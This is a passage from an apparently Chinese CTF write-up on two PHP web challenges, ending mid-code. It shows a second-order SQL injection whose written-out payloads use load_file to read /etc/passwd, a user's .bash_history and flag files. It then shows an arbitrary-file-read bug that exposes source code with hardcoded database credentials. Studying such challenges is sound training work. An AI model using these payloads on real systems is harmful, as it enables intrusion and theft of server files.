    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token function">mysql_num_rows</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$category</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'category'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$sql</span> <span class="token operator">=</span> "insert into comment
            set category <span class="token operator">=</span> <span class="token string">'$category'</span><span class="token punctuation">,</span>
                content <span class="token operator">=</span> <span class="token string">'$content'</span><span class="token punctuation">,</span>
                bo_id <span class="token operator">=</span> <span class="token string">'$bo_id'</span>"<span class="token punctuation">;</span>
    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: ./comment.php?id=$bo_id"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">break</span><span class="token punctuation">;</span>
<span class="token keyword">default</span><span class="token punctuation">:</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span><span class="token punctuation">{</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span></code></pre>
<p>大概率二次注入，参数除了有转义以外没有其他过滤。</p>
<p>可以看到两个case里都存在$category这个参数，write里的是用户post传入，而comment里的是从数据库取出来的。</p>
<p>case write:</p>
<pre class=" language-php"><code class="language-php"><span class="token variable">$category</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'category'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$title</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'title'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$sql</span> <span class="token operator">=</span> "insert into board
        set category <span class="token operator">=</span> <span class="token string">'$category'</span><span class="token punctuation">,</span>
            title <span class="token operator">=</span> <span class="token string">'$title'</span><span class="token punctuation">,</span>
            content <span class="token operator">=</span> <span class="token string">'$content'</span>"<span class="token punctuation">;</span></code></pre>
<p>case comment:</p>
<pre class=" language-php"><code class="language-php"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select category from board where id='$bo_id'"</span><span class="token punctuation">;</span>
<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$num</span> <span class="token operator">=</span> <span class="token function">mysql_num_rows</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
<span class="token variable">$category</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'category'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$sql</span> <span class="token operator">=</span> "insert into comment
        set category <span class="token operator">=</span> <span class="token string">'$category'</span><span class="token punctuation">,</span>
            content <span class="token operator">=</span> <span class="token string">'$content'</span><span class="token punctuation">,</span>
            bo_id <span class="token operator">=</span> <span class="token string">'$bo_id'</span>"<span class="token punctuation">;</span>
<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>尽管write中插入数据时做了转义，但实际上存入数据库里的数据是并没有被转义的。因此write时存入一个$category，如</p>
<pre class=" language-php"><code class="language-php">'<span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token function">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span>，<span class="token operator">/</span><span class="token operator">*</span></code></pre>
<p>同时comment中存入一个$content,如</p>
<pre class=" language-php"><code class="language-php"><span class="token operator">*</span><span class="token operator">/</span><span class="token shell-comment comment">#</span></code></pre>
<p>当comment执行insert语句时就会造成二次注入。</p>
<pre class=" language-php"><code class="language-php">insert into comment
       set category <span class="token operator">=</span> <span class="token string">' '</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token function">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span>，<span class="token comment" spellcheck="true">/*',
           content = '*/</span><span class="token shell-comment comment">#',</span>
           bo_id <span class="token operator">=</span> <span class="token string">'$bo_id'</span>"<span class="token punctuation">;</span></code></pre>
<p>综上，就可以构造语句找flag文件了。</p>
<p>（找文件的思路还要再学学 o.o</p>
<p>etc/passwd</p>
<pre class=" language-php"><code class="language-php">'<span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token punctuation">(</span><span class="token function">select</span><span class="token punctuation">(</span><span class="token function">load_file</span><span class="token punctuation">(</span><span class="token string">"/etc/passwd"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">/</span><span class="token operator">*</span></code></pre>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201208134544946.png" srcset="/img/loading.gif" alt="image-20201208134544946"></p>
<p>看到www用了bash登录，查看bash_history</p>
<pre class=" language-php"><code class="language-php">'<span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token punctuation">(</span><span class="token function">select</span><span class="token punctuation">(</span><span class="token function">load_file</span><span class="token punctuation">(</span><span class="token string">"/home/www/.bash_history"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">/</span><span class="token operator">*</span> </code></pre>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201208135140457.png" srcset="/img/loading.gif" alt="image-20201208135140457"></p>
<p>删除了.DS_Store,那大概就是要找到他了。(hex显示完整文件)，解出来得到flag_8946e1ff1ee3e40f.php</p>
<pre class=" language-php"><code class="language-php">'<span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token punctuation">(</span>select <span class="token function">hex</span><span class="token punctuation">(</span><span class="token function">load_file</span><span class="token punctuation">(</span><span class="token string">"/tmp/html/.DS_Store"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">/</span><span class="token operator">*</span></code></pre>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201208140034925.png" srcset="/img/loading.gif" alt="image-20201208140034925"></p>
<pre class=" language-php"><code class="language-php">'<span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token punctuation">(</span>select <span class="token function">hex</span><span class="token punctuation">(</span><span class="token function">load_file</span><span class="token punctuation">(</span><span class="token string">"/tmp/html/flag_8946e1ff1ee3e40f.php"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">/</span><span class="token operator">*</span></code></pre>
<p>得到flag,但是不对，啊这..</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201208140259192.png" srcset="/img/loading.gif" alt="image-20201208140259192"></p>
<p>想起来还有一个/var下的,得到正确flag。</p>
<pre class=" language-php"><code class="language-php">'<span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token punctuation">(</span>select <span class="token function">hex</span><span class="token punctuation">(</span><span class="token function">load_file</span><span class="token punctuation">(</span><span class="token string">"/var/www/html/flag_8946e1ff1ee3e40f.php"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">/</span><span class="token operator">*</span></code></pre>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201208140520735.png" srcset="/img/loading.gif" alt="image-20201208140520735"></p>
<h1 id="CISCN-2019-华北赛区-Day1-Web-Web1"><a href="#CISCN-2019-华北赛区-Day1-Web-Web1" class="headerlink" title="CISCN-2019-华北赛区-Day1-Web-Web1"></a>CISCN-2019-华北赛区-Day1-Web-Web1</h1><p>首先是个登录注册界面，不考虑其他的先随便注册一个登进去看看。</p>
<p>进入之后是一个上传文件，简单传了几个文件发现并没有做很严格的限制；除此之外上传的文件还有下载和删除功能；上传、下载、删除都分别抓了下包，发现在下载界面的download.php这里存在任意文件读取，依次读取以下源码：</p>
<pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//index.php</span>
<span class="token delimiter">&lt;?php</span>
<span class="token keyword">include</span> <span class="token string">"class.php"</span><span class="token punctuation">;</span>

<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileList</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'sandbox'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">Name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">Size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span></code></pre>
<pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//class.php</span>
<span class="token delimiter">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$dbaddr</span> <span class="token operator">=</span> <span class="token string">"127.0.0.1"</span><span class="token punctuation">;</span>
<span class="token variable">$dbuser</span> <span class="token operator">=</span> <span class="token string">"root"</span><span class="token punctuation">;</span>
<span class="token variable">$dbpass</span> <span class="token operator">=</span> <span class="token string">"root"</span><span class="token punctuation">;</span>
<span class="token variable">$dbname</span> <span class="token operator">=</span> <span class="token string">"dropbox"</span><span class="token punctuation">;</span>
<span class="token variable">$db</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token variable">$dbaddr</span><span class="token punctuation">,</span> <span class="token variable">$dbuser</span><span class="token punctuation">,</span> <span class="token variable">$dbpass</span><span class="token punctuation">,</span> <span class="token variable">$dbname</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$db</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">global</span> <span class="token variable">$db</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">db</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">user_exist</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token string">"SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bind_param</span><span class="token punctuation">(</span><span class="token string">"s"</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">store_result</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$count</span> <span class="token operator">=</span> <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">num_rows</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$count</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">add_user</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">user_exist</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$password</span> <span class="token punctuation">.</span> <span class="token string">"SiAchGHmFx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token string">"INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bind_param</span><span class="token punctuation">(</span><span class="token string">"ss"</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">verify_user</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">user_exist</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$password</span> <span class="token punctuation">.</span> <span class="token string">"SiAchGHmFx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token string">"SELECT `password` FROM `users` WHERE `username` = ?;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bind_param</span><span class="token punctuation">(</span><span class="token string">"s"</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bind_result</span><span class="token punctuation">(</span><span class="token variable">$expect</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$expect</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$expect</span> <span class="token operator">===</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">FileList</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token variable">$files</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$results</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$funcs</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">results</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">funcs</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$filenames</span> <span class="token operator">=</span> <span class="token function">scandir</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">array_search</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span> <span class="token variable">$filenames</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">unset</span><span class="token punctuation">(</span><span class="token variable">$filenames</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">array_search</span><span class="token punctuation">(</span><span class="token string">".."</span><span class="token punctuation">,</span> <span class="token variable">$filenames</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">unset</span><span class="token punctuation">(</span><span class="token variable">$filenames</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$filenames</span> <span class="token keyword">as</span> <span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$path</span> <span class="token punctuation">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">results</span><span class="token punctuation">[</span><span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__call</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">funcs</span><span class="token punctuation">,</span> <span class="token variable">$func</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">results</span><span class="token punctuation">[</span><span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$func</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token variable">$func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$table</span> <span class="token operator">=</span> <span class="token string">'&lt;div id="container" class="container">&lt;div class="table-responsive">&lt;table id="table" class="table table-bordered table-hover sm-font">'</span><span class="token punctuation">;</span>
        <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'&lt;thead>&lt;tr>'</span><span class="token punctuation">;</span>
        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">funcs</span> <span class="token keyword">as</span> <span class="token variable">$func</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'&lt;th scope="col" class="text-center">'</span> <span class="token punctuation">.</span> <span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'&lt;/th>'</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'&lt;th scope="col" class="text-center">Opt&lt;/th>'</span><span class="token punctuation">;</span>
        <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'&lt;/thead>&lt;tbody>'</span><span class="token punctuation">;</span>
        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">results</span> <span class="token keyword">as</span> <span class="token variable">$filename</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'&lt;tr>'</span><span class="token punctuation">;</span>
            <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$result</span> <span class="token keyword">as</span> <span class="token variable">$func</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'&lt;td class="text-center">'</span> <span class="token punctuation">.</span> <span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'&lt;/td>'</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'&lt;td class="text-center" filename="'</span> <span class="token punctuation">.</span> <span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'">&lt;a href="#" class="download">涓嬭浇&lt;/a> / &lt;a href="#" class="delete">鍒犻櫎&lt;/a>&lt;/td>'</span><span class="token punctuation">;</span>
            <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'&lt;/tr>'</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">echo</span> <span class="token variable">$table</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">File</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span> <span class="token operator">=</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
